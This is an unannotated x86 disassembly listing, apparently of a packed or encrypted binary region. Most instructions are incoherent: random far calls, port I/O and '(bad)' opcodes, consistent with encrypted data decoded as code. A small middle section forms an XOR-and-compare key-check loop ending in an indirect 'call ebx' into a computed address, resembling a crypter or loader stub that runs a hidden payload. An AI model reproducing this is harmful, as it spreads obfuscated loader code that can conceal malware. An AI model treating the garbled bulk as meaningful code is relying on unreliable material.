  40d978:	and    al,0x1d
  40d97a:	mov    ebp,0x47548164
  40d97f:	rcl    BYTE PTR [ebx-0x57],cl
  40d982:	pop    ds
  40d983:	xchg   BYTE PTR [ebx-0x612bfbc2],dl
  40d989:	push   edi
  40d98a:	jp     0x40d9d6
  40d98c:	and    BYTE PTR ss:[ecx],bl
  40d98f:	repz mov cl,ah
  40d992:	in     al,dx
  40d993:	push   edx
  40d994:	inc    eax
  40d995:	pop    es
  40d996:	push   edx
  40d997:	xchg   DWORD PTR [edi],ebx
  40d999:	or     BYTE PTR [esi],al
  40d99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d99c:	jo     0x40d9ab
  40d99e:	cmpxchg esp,esi
  40d9a1:	out    dx,eax
  40d9a2:	in     eax,0x88
  40d9a4:	sub    BYTE PTR [ebp-0x69581b17],bl
  40d9aa:	sahf   
  40d9ab:	test   BYTE PTR [edi+0x2e],bh
  40d9ae:	jge    0x40d98e
  40d9b0:	jnp    0x40d965
  40d9b2:	jns    0x40da04
  40d9b4:	jmp    0x40d98d
  40d9b6:	jne    0x40d9df
  40d9b8:	call   0x8cf5:0xd4005e4d
  40d9bf:	mov    ebp,0xd4205892
  40d9c4:	retf   0xe92d
  40d9c7:	xchg   ebx,eax
  40d9c8:	loope  0x40d993
  40d9ca:	sub    edi,esi
  40d9cc:	and    dl,BYTE PTR [edi+0x4b]
  40d9cf:	adc    dl,bh
  40d9d1:	mov    bh,0xac
  40d9d3:	lea    eax,[edi+0x50]
  40d9d6:	add    al,0xe8
  40d9d8:	popf   
  40d9d9:	idiv   bh
  40d9db:	pop    ebx
  40d9dc:	daa    
  40d9dd:	mov    dh,0xac
  40d9df:	inc    ebx
  40d9e0:	xor    DWORD PTR [ebp+0x509d85ef],eax
  40d9e6:	push   eax
  40d9e7:	sbb    al,0x51
  40d9e9:	call   0xd0ae3095
  40d9ee:	pop    ebp
  40d9ef:	test   al,0xdd
  40d9f1:	mov    bh,0x64
  40d9f3:	mov    ah,0xcc
  40d9f5:	adc    ebp,DWORD PTR [esi+ebx*2]
  40d9f8:	push   ecx
  40d9f9:	pop    edx
  40d9fb:	jns    0x40d984
  40d9fd:	cmp    bh,bl
  40d9ff:	hlt    
  40da00:	and    DWORD PTR [esi-0x54dacdd8],esp
  40da06:	out    0x66,al
  40da08:	std    
  40da09:	aaa    
  40da0a:	aaa    
  40da0b:	in     eax,0x8f
  40da0d:	mov    bl,0xc4
  40da0f:	iret   
  40da10:	xchg   ebx,eax
  40da11:	dec    edi
  40da12:	mov    al,ds:0x68de6d2c
  40da17:	mov    ds:0xd6a42e00,eax
  40da1c:	lds    ecx,FWORD PTR [ebx-0x46]
  40da1f:	idiv   DWORD PTR [esi]
  40da21:	popa   
  40da22:	scas   eax,DWORD PTR es:[edi]
  40da23:	int    0x9f
  40da25:	inc    eax
  40da26:	(bad)  
  40da27:	cmp    dl,bh
  40da29:	cmp    al,0xde
  40da2b:	psubb  mm5,QWORD PTR [ebx+0x41586f20]
  40da32:	sub    eax,0x45795bbc
  40da37:	push   0xe2f994a0
  40da3c:	pop    ds
  40da3d:	mov    bh,0x8c
  40da3f:	and    BYTE PTR [edi],ah
  40da41:	cdq    
  40da42:	outs   dx,BYTE PTR ds:[esi]
  40da43:	imul   edi,ecx,0x9f14ff1f
  40da49:	push   edx
  40da4a:	sub    DWORD PTR [ecx-0x26],ebp
  40da4d:	jle    0x40dabe
  40da4f:	fisub  WORD PTR [edx]
  40da51:	fist   WORD PTR ds:0x87f9c526
  40da57:	sbb    ch,ah
  40da59:	cmp    BYTE PTR [edx],bh
  40da5b:	mov    esp,0x596b4387
  40da60:	jb     0x40da62
  40da62:	xchg   ecx,eax
  40da63:	(bad)  
  40da64:	lahf   
  40da65:	or     al,0x28
  40da67:	lock mov edx,0xd338d64c
  40da6d:	out    dx,eax
  40da6e:	(bad)  
  40da6f:	adc    al,0xdf
  40da71:	add    eax,ebp
  40da73:	and    edi,edi
  40da75:	ja     0x40da4b
  40da77:	jne    0x40da03
  40da79:	call   0x34f8:0x2f2be9d
  40da80:	shl    DWORD PTR [edi-0x35],cl
  40da83:	mov    ebx,DWORD PTR [esi-0x7b43cc5c]
  40da89:	loop   0x40dab9
  40da8b:	mov    eax,0xf3169065
  40da90:	les    ecx,FWORD PTR [esi-0xde4c85d]
  40da96:	dec    ecx
  40da97:	push   edx
  40da98:	jae    0x40da89
  40da9a:	not    DWORD PTR [ebx+0x5e3faf7d]
  40daa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa2:	(bad)  
  40daa3:	cli    
  40daa4:	pop    edi
  40daa5:	adc    bh,BYTE PTR ds:0xd2cce8bb
  40daab:	mov    esi,edi
  40daad:	je     0x40da76
  40daaf:	mov    bh,0x1a
  40dab1:	mov    dh,0x8d
  40dab3:	mov    eax,0xb3b8a033
  40dab8:	aas    
  40dab9:	jge    0x40da6d
  40dabb:	mov    dl,0x15
  40dabd:	popf   
  40dabe:	out    0x39,al
  40dac0:	cmp    ecx,DWORD PTR [eax-0xd220440]
  40dac6:	add    al,0x1c
  40dac8:	int    0x6f
  40daca:	xor    esi,edx
  40dacc:	imul   ecx,DWORD PTR [ebp+edx*2+0x523acd6e],0x5a
  40dad4:	into   
  40dad5:	adc    ebx,DWORD PTR [eax]
  40dad7:	adc    edx,esp
  40dad9:	repnz fnstsw ax
  40dadc:	and    dl,BYTE PTR [ecx-0x2b62057f]
  40dae2:	cbw    
  40dae4:	pop    eax
  40dae5:	mov    edx,DWORD PTR [esi]
  40dae7:	xor    DWORD PTR [esi+ecx*4-0x6164c9f0],0x2ac5ef26
  40daf2:	gs mov dh,cl
  40daf5:	emms   
  40daf7:	xchg   ecx,eax
  40daf8:	sar    BYTE PTR [eax],1
  40dafa:	jb     0x40db09
  40dafc:	stc    
  40dafd:	add    dl,bl
  40daff:	(bad)  
  40db00:	pop    ebp
  40db01:	jno    0x40dafa
  40db03:	push   edx
  40db04:	daa    
  40db05:	pusha  
  40db06:	(bad)  [edi-0x5a]
  40db09:	retf   0x3911
  40db0c:	int3   
  40db0d:	jbe    0x40db1c
  40db0f:	and    al,0x1c
  40db11:	add    ch,BYTE PTR [ecx-0x2da29d27]
  40db17:	mov    ecx,0xdfd3be28
  40db1c:	in     eax,0xa
  40db1e:	cmp    al,0x6e
  40db20:	or     DWORD PTR [ebp-0x2b],edi
  40db23:	pop    ds
  40db24:	lods   eax,DWORD PTR ds:[esi]
  40db25:	jle    0x40dae0
  40db27:	dec    esi
  40db28:	sub    eax,0xffffffd9
  40db2b:	iret   
  40db2c:	inc    ebp
  40db2d:	xchg   ecx,eax
  40db2e:	xchg   ebx,eax
  40db2f:	adc    DWORD PTR [ecx],ebx
  40db31:	arpl   WORD PTR [ebp-0x66],si
  40db34:	push   cs
  40db35:	and    DWORD PTR gs:[esi+0x3],ebx
  40db39:	adc    ebp,esp
  40db3b:	push   edx
  40db3c:	jo     0x40db22
  40db3e:	shr    esp,0x1d
  40db41:	push   ecx
  40db42:	mov    ebx,0xeaa7fcd8
  40db48:	sti    
  40db49:	jae    0x40db29
  40db4b:	jg     0x40dafb
  40db4d:	lds    ebp,FWORD PTR [edx]
  40db4f:	mov    ebp,0x8ba75428
  40db54:	jmp    0x40db0c
  40db56:	dec    ebp
  40db57:	jns    0x40dbd5
  40db59:	std    
  40db5a:	xchg   ebx,eax
  40db5b:	das    
  40db5c:	push   ebx
  40db5d:	je     0x40dafb
  40db5f:	sub    eax,0x7a695042
  40db64:	jecxz  0x40db3d
  40db66:	mov    ds,ebp
  40db68:	cli    
  40db69:	aaa    
  40db6a:	sub    DWORD PTR [ecx-0x6a],ecx
  40db6d:	xchg   edx,eax
  40db6e:	inc    eax
  40db6f:	test   al,0x72
  40db71:	push   ds
  40db72:	cmp    esi,ebp
  40db74:	xchg   ecx,eax
  40db75:	push   ds
  40db76:	popa   
  40db77:	jmp    0x33d0d3c7
  40db7c:	xchg   eax,ecx
  40db7e:	adc    BYTE PTR [ecx-0x5f],0x1b
  40db82:	arpl   WORD PTR [edi+0x3b647137],si
  40db88:	mov    al,0x1b
  40db8a:	jne    0x40db1a
  40db8c:	or     eax,0x33cea569
  40db91:	les    edi,FWORD PTR [edx+0x4b]
  40db94:	jo     0x40dbd5
  40db96:	leave  
  40db97:	fs inc ebp
  40db99:	out    dx,eax
  40db9a:	dec    eax
  40db9b:	out    dx,al
  40db9c:	pop    ss
  40db9d:	mov    ebx,0xf371f993
  40dba2:	int    0xe8
  40dba4:	pop    ecx
  40dba5:	xor    edi,DWORD PTR [ebx]
  40dba7:	inc    edi
  40dba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dba9:	adc    dh,BYTE PTR [edx+eax*1-0x3f875b12]
  40dbb0:	stos   BYTE PTR es:[edi],al
  40dbb1:	xchg   edi,eax
  40dbb2:	fidivr DWORD PTR [ecx-0x5f3ffd6e]
  40dbb8:	aad    0x27
  40dbba:	add    ecx,ecx
  40dbbc:	fstp   TBYTE PTR [esi]
  40dbbe:	dec    esp
  40dbbf:	repnz mov ch,0xaa
  40dbc2:	xor    DWORD PTR [ecx+0x5e3c3f4d],edx
  40dbc8:	(bad)  
  40dbc9:	rcr    DWORD PTR [edi],0x5f
  40dbcc:	cmp    ah,bl
  40dbce:	jmp    0xbf8fc564
  40dbd3:	ins    BYTE PTR es:[edi],dx
  40dbd4:	jns    0x40dc19
  40dbd6:	inc    edx
  40dbd7:	cmp    eax,0xe8501e10
  40dbdc:	int3   
  40dbdd:	inc    ebp
  40dbde:	cli    
  40dbdf:	mov    al,0x7d
  40dbe1:	jmp    0x40db6a
  40dbe3:	lods   eax,DWORD PTR ds:[esi]
  40dbe4:	sbb    dh,BYTE PTR [ecx*8+0x4fed7fca]
  40dbeb:	ds push edx
  40dbed:	or     ecx,ecx
  40dbef:	neg    DWORD PTR [ecx]
  40dbf1:	ret    0x7caa
  40dbf4:	call   0x40a8:0x825bb2e7
  40dbfb:	pop    eax
  40dbfc:	push   esp
  40dbfd:	sti    
  40dbfe:	sbb    al,0xa9
  40dc00:	pop    esp
  40dc01:	out    0x11,al
  40dc03:	sar    ch,cl
  40dc05:	shl    BYTE PTR [esp+eax*2+0x1f],1
  40dc09:	sub    edi,ebp
  40dc0b:	test   DWORD PTR [edx+ebp*2+0x43],eax
  40dc0f:	jmp    0xcf74:0xa058d38c
  40dc16:	retf   0xd6a9
  40dc19:	mov    edi,0xd48ed4a1
  40dc1e:	pop    esi
  40dc1f:	in     al,dx
  40dc20:	fisubr WORD PTR [esi]
  40dc22:	pop    esp
  40dc23:	cmp    al,0xd3
  40dc25:	jbe    0x40dc2b
  40dc27:	loop   0x40dbf9
  40dc29:	in     al,0x81
  40dc2b:	clc    
  40dc2c:	sets   ah
  40dc2f:	leave  
  40dc30:	mov    BYTE PTR [eax],dl
  40dc32:	jnp    0x40dc1d
  40dc34:	sbb    eax,0xd6f224a4
  40dc39:	arpl   WORD PTR [ebp+0x31a9cad1],cx
  40dc3f:	test   DWORD PTR [esi-0x9b680ec],ebp
  40dc45:	sub    BYTE PTR ds:0xebbbd3ce,ch
  40dc4b:	sub    dl,0x18
  40dc4e:	out    dx,al
  40dc4f:	sub    ah,ch
  40dc51:	imul   esi,ebx,0x898b10f0
  40dc57:	je     0x40dcd4
  40dc59:	push   0x6bc76784
  40dc5e:	lea    ecx,fs:[edi-0x74e5e672]
  40dc65:	push   ebp
  40dc66:	or     BYTE PTR [ebx+0x1be9dc7d],cl
  40dc6c:	add    eax,DWORD PTR [eax]
  40dc6e:	add    dl,dh
  40dc70:	cmp    al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0xd313768]
  40dc7d:	in     eax,0x1f
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dc8a
  40dc88:	mov    dh,0xf4
  40dc8a:	cmp    eax,0x99da118e
  40dc8f:	cmp    BYTE PTR [ebp-0x7d],bl
  40dc92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc93:	fnstcw WORD PTR [edi-0x79]
  40dc96:	retf   0x7f8
  40dc99:	jl     0x40dc53
  40dc9b:	int3   
  40dc9c:	je     0x40dcbd
  40dc9e:	inc    ebx
  40dc9f:	fcmovnu st,st(3)
  40dca1:	inc    esp
  40dca2:	push   edx
  40dca3:	ja     0x40dcae
  40dca5:	pushf  
  40dca6:	mov    ch,ah
  40dca8:	add    ah,BYTE PTR [edx+0x5a]
  40dcab:	adc    edi,DWORD PTR [ebp-0x5b]
  40dcae:	add    edx,DWORD PTR ds:[edx-0x39]
  40dcb2:	pop    esi
  40dcb3:	add    al,0xa2
  40dcb5:	mov    al,ds:0x476c172b
  40dcba:	cs jg  0x40dc95
  40dcbd:	push   ecx
  40dcbe:	and    ch,BYTE PTR [eax]
  40dcc0:	xor    ebp,ecx
  40dcc2:	ins    BYTE PTR es:[edi],dx
  40dcc3:	test   ebp,edi
  40dcc5:	aam    0x6
  40dcc7:	dec    ebp
  40dcc8:	shl    BYTE PTR [ebx],0x3f
  40dccb:	retf   
  40dccc:	popf   
  40dccd:	pop    ss
  40dcce:	inc    edi
  40dccf:	jae    0x40dc76
  40dcd1:	pop    edi
  40dcd2:	lds    edi,FWORD PTR [edx+0x3]
  40dcd5:	stos   BYTE PTR es:[edi],al
  40dcd6:	jb     0x40dc7f
  40dcd8:	xor    ebp,DWORD PTR [eax]
  40dcda:	mov    dl,0xef
  40dcdc:	lods   eax,DWORD PTR ds:[esi]
  40dcdd:	mov    BYTE PTR [edi],al
  40dcdf:	out    0xbf,al
  40dce1:	ret    
  40dce2:	and    BYTE PTR [edx+ebx*8-0x1550b6b5],dh
  40dce9:	loopne 0x40dc93
  40dceb:	cdq    
  40dcec:	or     BYTE PTR [edi],dh
  40dcee:	or     esp,DWORD PTR [ecx]
  40dcf0:	sbb    ch,BYTE PTR [edx-0x798de127]
  40dcf6:	test   bl,bl
  40dcf8:	cmp    al,0x26
  40dcfa:	push   ebp
  40dcfb:	or     BYTE PTR [eax+0x75],0x5f
  40dcff:	or     ebx,ecx
  40dd01:	(bad)  
  40dd02:	(bad)  
  40dd03:	scas   al,BYTE PTR es:[edi]
  40dd04:	repz mov ch,0x3b
  40dd07:	mov    esi,0xaa60f101
  40dd0c:	add    al,0xa8
  40dd0e:	push   ss
  40dd0f:	mov    ecx,0xd84c7f27
  40dd14:	imul   esp,ebx,0x220a0250
  40dd1a:	out    0x42,eax
  40dd1c:	jg     0x40dd0f
  40dd1e:	mov    DWORD PTR [eax],ecx
  40dd20:	mov    esi,0xffb862c3
  40dd25:	sub    al,0xab
  40dd27:	popf   
  40dd28:	mov    ds:0x6d2b96b1,eax
  40dd2d:	xchg   al,al
  40dd2f:	loopne 0x40dcc5
  40dd31:	out    dx,eax
  40dd32:	jnp    0x40dcbe
  40dd34:	jg     0xddf580e1
  40dd3a:	inc    ebp
  40dd3b:	loopne 0x40dced
  40dd3d:	mov    bh,0x6d
  40dd3f:	xor    ah,BYTE PTR [edx+0x28ef540]
  40dd45:	jo     0x40dd3c
  40dd47:	enter  0x8097,0x15
  40dd4b:	add    dh,BYTE PTR [edi+0x63]
  40dd4e:	mov    DWORD PTR [edi],esp
  40dd50:	cmp    BYTE PTR [esi+0xca37611],bh
  40dd56:	es out 0x3c,eax
  40dd59:	xlat   BYTE PTR ds:[ebx]
  40dd5a:	sbb    ah,BYTE PTR [ebp+0x71]
  40dd5d:	outs   dx,DWORD PTR ds:[esi]
  40dd5e:	mov    fs,esi
  40dd60:	mov    al,0x53
  40dd62:	xchg   esi,eax
  40dd63:	fild   QWORD PTR [edx+0x3b49c9fa]
  40dd69:	addr16 cs retf 
  40dd6c:	ja     0x40dd71
  40dd6e:	jno    0x40dd36
  40dd70:	inc    ebp
  40dd71:	xchg   ecx,eax
  40dd72:	in     al,dx
  40dd73:	cdq    
  40dd74:	rcr    BYTE PTR [ebp+0x19f3ac32],1
  40dd7a:	pop    eax
  40dd7b:	sbb    eax,0xab7d50c1
  40dd80:	cld    
  40dd81:	pop    ss
  40dd82:	sar    BYTE PTR [esi+0x5a],0xb7
  40dd86:	mov    eax,0xa9f42524
  40dd8b:	and    ch,BYTE PTR [edi+0x66e534f9]
  40dd91:	push   eax
  40dd92:	inc    esi
  40dd93:	xchg   edi,eax
  40dd94:	aam    0x91
  40dd96:	outs   dx,BYTE PTR ds:[esi]
  40dd97:	enter  0xd319,0xed
  40dd9b:	sar    ebp,cl
  40dd9d:	xchg   ecx,eax
  40dd9e:	(bad)  
  40dd9f:	js     0x40ddc2
  40dda1:	push   ecx
  40dda2:	jnp    0x40dd25
  40dda4:	mov    al,ds:0xd900e552
  40dda9:	test   eax,0x3162d101
  40ddae:	das    
  40ddaf:	fs or  al,0x6
  40ddb2:	test   eax,0x2d515d65
  40ddb7:	inc    ebx
  40ddb8:	or     al,0xf
  40ddba:	add    al,0x4e
  40ddbc:	(bad)  
  40ddbd:	out    dx,eax
  40ddbe:	inc    ecx
  40ddbf:	sub    al,0xe6
  40ddc1:	dec    ebp
  40ddc2:	sub    eax,0x7f6f7517
  40ddc7:	xor    DWORD PTR [ebp-0xd],esp
  40ddca:	mov    dh,0xec
  40ddcc:	mov    esp,0x826caa7d
  40ddd1:	lods   eax,DWORD PTR ds:[esi]
  40ddd2:	(bad)  
  40ddd3:	clc    
  40ddd4:	sar    dl,1
  40ddd6:	and    bl,BYTE PTR [ebp-0x2a9669f]
  40dddc:	dec    eax
  40dddd:	lea    ecx,[esi+edi*2]
  40dde0:	js     0x40de13
  40dde2:	xor    DWORD PTR ds:0xc10b349b,edi
  40dde8:	pop    ecx
  40dde9:	mov    ebp,0xcff96eef
  40ddee:	add    BYTE PTR [edi+0x707051ea],bh
  40ddf4:	addr16 mov edi,0x41419e06
  40ddfa:	imul   esi,DWORD PTR [eax-0x37],0x50cadd93
  40de01:	pop    esp
  40de02:	sar    BYTE PTR [ebx+0x3ed1fb39],0xb5
  40de09:	leave  
  40de0a:	push   esp
  40de0b:	and    eax,0x2016702b
  40de10:	push   ecx
  40de11:	and    al,0xf7
  40de13:	repz loopne 0x40de85
  40de16:	sti    
  40de17:	xor    eax,0xcc0a9af0
  40de1c:	dec    eax
  40de1d:	mov    dh,0xf6
  40de1f:	repz bound ecx,QWORD PTR [eax+0x76]
  40de23:	cmp    BYTE PTR [edx+eax*2+0x4f],dl
  40de27:	inc    esp
  40de28:	(bad)  
  40de29:	and    eax,0xca88b225
  40de2e:	add    ch,BYTE PTR [ebx-0x18]
  40de31:	mov    ebx,0xf309e480
  40de36:	mov    ds:0xf7428b44,eax
  40de3b:	adc    dl,bl
  40de3d:	mov    edx,0x4b28f17e
  40de42:	sbb    ah,al
  40de44:	xchg   edx,eax
  40de45:	mov    dl,0x66
  40de47:	pop    esp
  40de48:	inc    edi
  40de49:	retf   0xc114
  40de4c:	jmp    0x195c:0x9fc2160
  40de53:	ins    BYTE PTR es:[edi],dx
  40de54:	xchg   esp,eax
  40de55:	mov    ebp,0x1929171d
  40de5a:	enter  0x1057,0x7b
  40de5e:	js     0x40de46
  40de60:	xor    DWORD PTR [edi+0x6f40d6c5],ebp
  40de66:	outs   dx,DWORD PTR ds:[esi]
  40de67:	fsubr  QWORD PTR [ebx-0x2bdff39d]
  40de6d:	das    
  40de6e:	stc    
  40de6f:	outs   dx,BYTE PTR ds:[esi]
  40de70:	xor    al,BYTE PTR [eax]
  40de72:	fld    TBYTE PTR ds:0x99d36d0c
  40de78:	jp     0x40de3e
  40de7a:	or     BYTE PTR [edx],ah
  40de7c:	add    eax,0xe1eeaffd
  40de81:	mov    bh,0x1c
  40de83:	pop    eax
  40de84:	adc    bl,bh
  40de86:	cmp    esi,DWORD PTR [ecx-0x7591a250]
  40de8c:	and    al,0x96
  40de8e:	cmp    BYTE PTR [esi-0x7c],0x59
  40de92:	sub    eax,0xd255eefd
  40de97:	pop    eax
  40de98:	push   ecx
  40de99:	or     esp,DWORD PTR [ebx-0x6caca04d]
  40de9f:	jecxz  0x40defc
  40dea1:	pop    ebp
  40dea2:	cmp    ebx,DWORD PTR [ebp+0x1eb25e95]
  40dea8:	pop    edi
  40dea9:	out    0x24,eax
  40deab:	int3   
  40deac:	sub    DWORD PTR [eax+0x28],ebx
  40deaf:	call   0xb44e:0xb88effd0
  40deb6:	pop    bp
  40deb8:	sub    eax,0x178acaca
  40debd:	pop    ebx
  40debe:	fistp  DWORD PTR [ecx-0x4fae6e74]
  40dec4:	shr    DWORD PTR [edx-0x7f2d6294],0xda
  40decb:	adc    DWORD PTR [esi],esi
  40decd:	nop
  40dece:	mov    ebp,edi
  40ded0:	scas   eax,DWORD PTR es:[edi]
  40ded1:	out    0x7b,al
  40ded3:	mov    eax,0xc3f04bc7
  40ded8:	jle    0x40dee6
  40deda:	arpl   WORD PTR [ebx],bp
  40dedc:	scas   eax,DWORD PTR es:[edi]
  40dedd:	call   0xa8084002
  40dee2:	and    BYTE PTR [esi-0x5e],dh
  40dee5:	sar    BYTE PTR [edx+0x55],cl
  40dee8:	je     0x40df00
  40deea:	inc    eax
  40deeb:	pop    ds
  40deec:	add    eax,0x87b1ca37
  40def1:	sub    al,0xcc
  40def3:	dec    ecx
  40def4:	jecxz  0x40ded6
  40def6:	jo     0x40df00
  40def8:	or     DWORD PTR [ebp+0x1b],ebx
  40defb:	mov    al,cl
  40defd:	and    BYTE PTR [esp+edx*4-0x13ba34d6],0xb
  40df05:	clc    
  40df06:	int3   
  40df07:	or     ch,BYTE PTR gs:[eax-0x6cb17282]
  40df0e:	xchg   ecx,eax
  40df0f:	mov    esp,DWORD PTR [edi+esi*8-0x41]
  40df13:	retf   
  40df14:	mov    edx,0x19e0e3ea
  40df19:	push   cs
  40df1a:	add    ecx,DWORD PTR [esi+0x58]
  40df1d:	popf   
  40df1e:	pop    ds
  40df1f:	pop    edi
  40df20:	call   0xae45:0xcab55024
  40df27:	ja     0x40df98
  40df29:	lahf   
  40df2a:	and    ecx,0xffffffa7
  40df2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df2e:	dec    ebx
  40df2f:	xchg   ebp,eax
  40df30:	pop    ebx
  40df31:	xor    al,0x2b
  40df33:	or     bh,BYTE PTR [ecx+ecx*8-0x7d]
  40df37:	add    BYTE PTR [ebp+0x7a],al
  40df3a:	mov    ah,0x25
  40df3c:	std    
  40df3d:	dec    ebp
  40df3e:	pop    ebx
  40df3f:	xor    eax,0x3e867f13
  40df44:	mov    ds:0x17efd93d,eax
  40df49:	and    esp,DWORD PTR [ecx]
  40df4b:	sbb    ah,BYTE PTR [ebx+0x7df70f31]
  40df51:	shl    ecx,0xed
  40df54:	dec    ebp
  40df55:	mov    ebx,0xc39ccde5
  40df5a:	xchg   edx,eax
  40df5b:	pop    es
  40df5c:	ins    BYTE PTR es:[edi],dx
  40df5d:	mov    ds,esp
  40df5f:	cmc    
  40df60:	(bad)  
  40df61:	adc    eax,0x8ae3a4f5
  40df66:	mov    bh,0x91
  40df68:	and    al,0xe7
  40df6a:	xor    dh,dh
  40df6c:	jno    0x40df14
  40df6e:	std    
  40df6f:	inc    ecx
  40df70:	es mov esi,0xa9c2d4dc
  40df76:	leave  
  40df77:	imul   esi,DWORD PTR [edi-0x1acb9212],0x11eb3368
  40df81:	pop    ecx
  40df82:	es dec esp
  40df84:	mov    fs,WORD PTR [ecx+edx*2-0x76e5e940]
  40df8b:	add    al,0x97
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs wbinvd 
  40e025:	imul   ecx,DWORD PTR [edx-0x78],0x7e7e9930
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	dec    edx
  40e031:	mov    bl,0x34
  40e033:	pusha  
  40e034:	mov    ecx,0x48a474f9
  40e039:	or     al,0x92
  40e03b:	out    dx,eax
  40e03c:	dec    esp
  40e03d:	push   edx
  40e03e:	(bad)  
  40e040:	xchg   ch,dl
  40e042:	int3   
  40e043:	sub    al,0x91
  40e045:	outs   dx,BYTE PTR ds:[esi]
  40e046:	mov    esp,0xa2f39fc7
  40e04b:	mov    cl,dh
  40e04d:	test   DWORD PTR [esi-0x26402615],eax
  40e053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e054:	cmp    cl,ah
  40e056:	or     edi,DWORD PTR [ebx+eax*8+0x34]
  40e05a:	adc    DWORD PTR [eax+0x345ad4c6],ebp
  40e060:	push   cs
  40e061:	adc    BYTE PTR [edi-0x71],dh
  40e064:	push   DWORD PTR [edx-0x56]
  40e067:	cmp    DWORD PTR fs:[ebp+0x5f9804d6],edi
  40e06e:	or     dh,BYTE PTR [edx+0x7f]
  40e071:	repz out 0x8a,al
  40e074:	sbb    ebp,DWORD PTR ds:0x6cb35dac
  40e07a:	in     eax,dx
  40e07b:	(bad)  
  40e07c:	mov    ebx,0x25827d11
  40e081:	push   ds
  40e082:	jg     0x40e0e5
  40e084:	mov    eax,ds:0xf245b895
  40e089:	retf   0xc30c
  40e08c:	frstor ds:[edi]
  40e08f:	xchg   esi,eax
  40e090:	xchg   edx,eax
  40e091:	pusha  
  40e092:	je     0x40e0cf
  40e094:	enter  0x6e12,0x6e
  40e098:	ja     0x40e026
  40e09a:	int3   
  40e09b:	cld    
  40e09c:	jl     0x40e109
  40e09e:	fstp   TBYTE PTR [edi+0x41]
  40e0a1:	add    dl,0xc6
  40e0a4:	sbb    BYTE PTR [ebp-0x17],cl
  40e0a7:	pop    esp
  40e0a8:	inc    ebp
  40e0a9:	shl    BYTE PTR [esi+0x3ea77e26],1
  40e0af:	(bad)  
  40e0b0:	(bad)  
  40e0b1:	call   0xed8941c6
  40e0b6:	cs scas al,BYTE PTR es:[edi]
  40e0b8:	std    
  40e0b9:	jae    0x40e108
  40e0bb:	mov    eax,ds:0x165389a1
  40e0c0:	xor    al,0xc3
  40e0c2:	int    0x4
  40e0c4:	(bad)  
  40e0c6:	push   ss
  40e0c7:	xor    BYTE PTR [esi+0x37],bl
  40e0ca:	mov    ebp,0xdd4cdd35
  40e0cf:	cdq    
  40e0d0:	test   al,0x4b
  40e0d2:	cs xchg ebx,eax
  40e0d4:	loopne 0x40e0d8
  40e0d6:	sbb    ebp,ebx
  40e0d8:	mov    dh,0x67
  40e0da:	in     eax,0x4c
  40e0dc:	sub    al,0x28
  40e0de:	adc    ebx,DWORD PTR [eax-0xebbdf93]
  40e0e4:	pop    esp
  40e0e5:	dec    esi
  40e0e6:	and    dh,BYTE PTR [edi+edx*8-0x35]
  40e0ea:	pushf  
  40e0eb:	add    DWORD PTR [edx-0x31],edx
  40e0ee:	pop    ds
  40e0ef:	clc    
  40e0f0:	popf   
  40e0f1:	mov    ebp,0xff460ad5
  40e0f6:	rcl    al,cl
  40e0f8:	cmp    BYTE PTR [ebp+0x7e1fab3e],dh
  40e0fe:	inc    edx
  40e0ff:	push   esi
  40e100:	xchg   edx,eax
  40e101:	ret    0xbaa6
  40e104:	fidiv  WORD PTR [edx-0x42]
  40e107:	or     dh,BYTE PTR [edx-0x50]
  40e10a:	iret   
  40e10b:	shl    cl,1
  40e10d:	xchg   esi,eax
  40e10e:	pop    eax
  40e10f:	fwait
  40e110:	scas   al,BYTE PTR es:[edi]
